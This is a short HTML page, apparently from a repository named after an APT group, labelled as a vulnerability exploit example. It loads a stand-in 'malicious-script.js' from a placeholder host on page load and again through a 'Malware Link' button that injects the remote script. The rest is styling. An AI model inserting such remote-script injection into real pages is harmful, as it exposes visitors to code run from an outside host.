# Echoflux-
APT21 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>

<h2 id='vulnerable'>Vulnerability Exploit Example (DON'T RUN THIS ON YOUR MACHINE)</h2>


<script src = "https://example.com/malicious-script.js"></script>

<p>This is an example of a vulnerable website.</p>

<div class="dark-mode">
    <button onclick="document.body.classList.add('light')">Light Mode</button>
    <button id='mal' onclick="
        var script=document.createElement('script');
            script.src = 'https://example.com/malicious-script.js';
            document.head.appendChild(script);
">Malware Link

      </div>

  <style>
   .dark-mode {
       background-color: #000;
       color:#fff;

    }
     body.light{
        transition: all 0.5s ease-in-out;
         transform-origin:left top ;
          -webkit-transition-timing-function:cubic-bezier(0,1,.47,1);
           box-shadow: none !important; 
            background-color : #ffffff !important ;  
              color:#000
               }
     body.light p{
        transition: all 0.5s ease-in-out;
         transform-origin:left top ;
          -webkit-transition-timing-function:cubic-bezier(0,1,.47,1);
           box-shadow: none !important; 
            background-color : #ffffff !important ;  
              color:#000
               }
      body.light h2{
        transition: all 0.5s ease-in-out;
         transform-origin:left top ;
          -webkit-transition-timing-function:cubic-bezier(0,1,.47,1);
           box-shadow: none !important; 
            background-color : #ffffff !important ;  
              color:#000
               }
    </style>
</body>
</html>

